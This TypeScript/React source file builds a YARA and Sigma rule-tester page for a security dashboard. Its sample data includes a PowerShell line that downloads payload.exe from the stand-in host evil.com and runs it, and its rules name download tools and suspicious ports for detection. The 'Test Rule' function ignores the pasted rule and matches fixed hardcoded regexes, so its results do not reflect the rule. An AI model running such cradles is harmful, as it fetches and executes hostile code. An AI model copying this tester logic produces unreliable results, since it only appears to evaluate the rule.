import { createFileRoute } from "@tanstack/react-router";
import { useMemo, useState } from "react";
import { PageShell } from "@/components/PageShell";
import { Panel, SectionBar, Chip } from "@/components/soc";
import { Empty } from "@/components/output";
import { Shield, AlertTriangle, CheckCircle, XCircle, TestTube, RotateCcw } from "lucide-react";

export const Route = createFileRoute("/sigma-tester")({ component: SigmaTesterPage });

const YARA_EXAMPLES = [
  {
    name: "Suspicious PowerShell Download",
    rule: `rule Suspicious_PowerShell_Download {
  meta:
    description = "Detects PowerShell download cradles"
    author = "SOC Team"
  strings:
    $download1 = "System.Net.WebClient" nocase
    $download2 = "Invoke-WebRequest" nocase
    $download3 = "curl" nocase
    $download4 = "wget" nocase
    $download5 = "DownloadFile" nocase
    $bypass1 = "bypass" nocase
  condition:
    ($download1 or $download2 or $download3 or $download4 or $download5) or $bypass1
}`,
    sample: `$client = New-Object System.Net.WebClient\n$client.DownloadFile("http://evil.com/payload.exe", "C:\\Users\\malware.exe")\nStart-Process "C:\\Users\\malware.exe"`
  },
  {
    name: "Base64 Encoded Data",
    rule: `rule Base64_Encoded_Data {
  meta:
    description = "Detects high-entropy base64 strings"
  strings:
    $b64 = /(?:[A-Za-z0-9+/]{4}){10,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?/
  condition:
    #b64 > 0
}`,
    sample: `token=ZXNjaGFsb25neXN0ZW1zIGFyZSBjb29sIGJ1dCB0aGlzIGlzIGEgdGVzdCBzdHJpbmcgZm9yIGJhc2U2NCBkZWNvZGluZw==`
  },
];

const SIGMA_EXAMPLES = [
  {
    name: "PowerShell Suspicious Flags",
    rule: `title: PowerShell Suspicious Flags
status: experimental
description: Detects PowerShell with suspicious execution flags
detection:
  selection:
    EventID: 4688
    CommandLine|contains|all:
      - 'powershell'
      - '-ExecutionPolicy'
      - 'Bypass'
      - '-NoProfile'
    CommandLine|contains:
      - 'Invoke-WebRequest'
      - 'DownloadFile'
      - '-EncodedCommand'
  condition: selection`,
    sample: `EventID: 4688\nCommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBhAG0AIABtAGEAbAB3AGEAcgBlAA==\nParentProcess: explorer.exe`
  },
  {
    name: "Suspicious Outbound Connection",
    rule: `title: Suspicious Outbound Connection
status: experimental
description: Detects processes connecting to known malicious IPs
detection:
  selection:
    EventID: 3
    Initiated: true
    DestinationIp|contains:
      - '185.220.101.'
      - '203.0.113.'
      - '5.188.62.'
    DestinationPort:
      - 4444
      - 1337
      - 8080
      - 8443
  condition: selection`,
    sample: `EventID: 3\nInitiated: true\nDestinationIp: 185.220.101.44\nDestinationPort: 4444\nProcessId: 1234\nImage: C:\\Users\\malware.exe`
  },
];

type MatchResult = { string: string; matched: boolean };

function SigmaTesterPage() {
  const [tab, setTab] = useState<"yara" | "sigma">("yara");
  const [rule, setRule] = useState(YARA_EXAMPLES[0].rule);
  const [sample, setSample] = useState(YARA_EXAMPLES[0].sample);
  const [results, setResults] = useState<MatchResult[]>([]);
  const [tested, setTested] = useState(false);

  function loadExample(idx: number) {
    const examples = tab === "yara" ? YARA_EXAMPLES : SIGMA_EXAMPLES;
    const ex = examples[idx];
    if (ex) { setRule(ex.rule); setSample(ex.sample); setTested(false); setResults([]); }
  }

  function handleTest() {
    setTested(true);
    if (tab === "yara") {
      const strings: MatchResult[] = [];
      const stringRxs = [
        { label: "System.Net.WebClient", rx: /System\.Net\.WebClient/i },
        { label: "Invoke-WebRequest", rx: /Invoke-WebRequest/i },
        { label: "curl", rx: /curl/i },
        { label: "wget", rx: /wget/i },
        { label: "DownloadFile", rx: /DownloadFile/i },
        { label: "bypass", rx: /bypass/i },
        { label: "base64/high-entropy string", rx: /(?:[A-Za-z0-9+/]{4}){10,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?/ },
        { label: "URL pattern", rx: /https?:\/\/[^\s)"']+/i },
        { label: "IP-address pattern", rx: /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/ },
        { label: "encoded powershell (-EncodedCommand)", rx: /-EncodedCommand|-e\s+[A-Za-z0-9+/=]{20,}/i },
        { label: "file download (.exe/.ps1/.dll)", rx: /\.(exe|ps1|dll|vbs|bat|msi)\b/i },
      ];
      for (const s of stringRxs) {
        strings.push({ string: s.label, matched: s.rx.test(sample) });
      }
      setResults(strings);
    } else {
      const checks: MatchResult[] = [];
      const checksList = [
        { label: "EventID: 4688 (process creation)", rx: /EventID:\s*4688/ },
        { label: "EventID: 3 (network connection)", rx: /EventID:\s*3/ },
        { label: "Initiated: true", rx: /Initiated:\s*true/ },
        { label: "powershell command line", rx: /powershell/i },
        { label: "ExecutionPolicy Bypass", rx: /ExecutionPolicy.*Bypass/i },
        { label: "NoProfile flag", rx: /-NoProfile/i },
        { label: "Suspicious destination port (4444/1337/8080/8443)", rx: /(4444|1337|8080|8443)/ },
        { label: "Suspicious IP range (185.220.101.x)", rx: /185\.220\.101\./ },
        { label: "EncodedCommand present", rx: /-EncodedCommand/i },
        { label: "DownloadFile or WebClient", rx: /(DownloadFile|WebClient)/i },
        { label: "URL in command line", rx: /https?:\/\/[^\s)"']+/i },
      ];
      for (const c of checksList) {
        checks.push({ string: c.label, matched: c.rx.test(sample) });
      }
      setResults(checks);
    }
  }

  const matchCount = results.filter((r) => r.matched).length;

  return (
    <PageShell
      eyebrow="TOOLS / RULE TESTER"
      title="YARA & Sigma Rule Tester"
      description="Paste a YARA or Sigma rule alongside your sample — see which conditions matched and which didn't, line by line."
      crumbs={[{ label: "Tools" }, { label: "Rule Tester" }]}
    >
      <div className="flex items-center gap-2 mb-4">
        <button onClick={() => { setTab("yara"); loadExample(0); }} className={"rounded border px-3 py-1.5 text-mono ba-text-2xs uppercase tracking-widest transition-colors " + (tab === "yara" ? "border-primary bg-primary/15 text-primary" : "border-border bg-card/40 text-muted-foreground hover:text-foreground")}>
          YARA
        </button>
        <button onClick={() => { setTab("sigma"); loadExample(0); }} className={"rounded border px-3 py-1.5 text-mono ba-text-2xs uppercase tracking-widest transition-colors " + (tab === "sigma" ? "border-primary bg-primary/15 text-primary" : "border-border bg-card/40 text-muted-foreground hover:text-foreground")}>
          Sigma
        </button>
        <div className="ml-4 flex items-center gap-1.5">
          {(tab === "yara" ? YARA_EXAMPLES : SIGMA_EXAMPLES).map((ex, i) => (
            <button key={i} onClick={() => loadExample(i)}
              className="rounded border border-border/60 bg-card/40 px-2 py-0.5 text-mono ba-text-2xs uppercase text-muted-foreground hover:text-foreground">
              {ex.name}
            </button>
          ))}
        </div>
      </div>

      <div className="grid grid-cols-2 gap-4">
        <Panel title={`Rule (${tab === "yara" ? "YARA" : "Sigma"})`} icon={Shield}>
          <textarea
            value={rule}
            onChange={(e) => { setRule(e.target.value); setTested(false); }}
            className="h-64 w-full resize-y rounded border border-border bg-background/60 p-3 font-mono text-sm text-foreground outline-none placeholder:text-muted-foreground/60 focus:border-primary/50"
          />
        </Panel>
        <Panel title="Sample Data" icon={TestTube}>
          <textarea
            value={sample}
            onChange={(e) => { setSample(e.target.value); setTested(false); }}
            className="h-64 w-full resize-y rounded border border-border bg-background/60 p-3 font-mono text-sm text-foreground outline-none placeholder:text-muted-foreground/60 focus:border-primary/50"
          />
        </Panel>
      </div>

      <div className="flex items-center gap-2">
        <button onClick={handleTest}
          className="inline-flex items-center gap-1.5 rounded border border-primary/40 bg-primary/10 px-4 py-2 text-mono ba-text-2xs uppercase tracking-widest text-primary hover:bg-primary/20">
          <TestTube className="h-3.5 w-3.5" /> Test Rule
        </button>
        {tested && (
          <span className="text-mono text-[11px] text-muted-foreground">
            {matchCount}/{results.length} conditions matched
          </span>
        )}
      </div>

      {tested && (
        <Panel title="Results" bodyClassName="p-0">
          <div className="divide-y divide-border/50">
            {results.map((r, i) => (
              <div key={i} className="flex items-center gap-3 px-4 py-2.5">
                {r.matched
                  ? <CheckCircle className="h-4 w-4 shrink-0 text-success" />
                  : <XCircle className="h-4 w-4 shrink-0 text-muted-foreground" />
                }
                <span className={"font-mono text-sm " + (r.matched ? "text-foreground/90" : "text-muted-foreground")}>{r.string}</span>
                <Chip tone={r.matched ? "success" : "default"}>{r.matched ? "MATCH" : "NO MATCH"}</Chip>
              </div>
            ))}
          </div>
          <div className="border-t border-border bg-card/30 px-4 py-2 text-right text-mono text-[11px] text-muted-foreground">
            {matchCount === 0
              ? "No conditions matched the sample — review your rule"
              : matchCount === results.length
                ? "All conditions matched!"
                : `${matchCount}/${results.length} conditions matched`
            }
          </div>
        </Panel>
      )}
    </PageShell>
  );
}
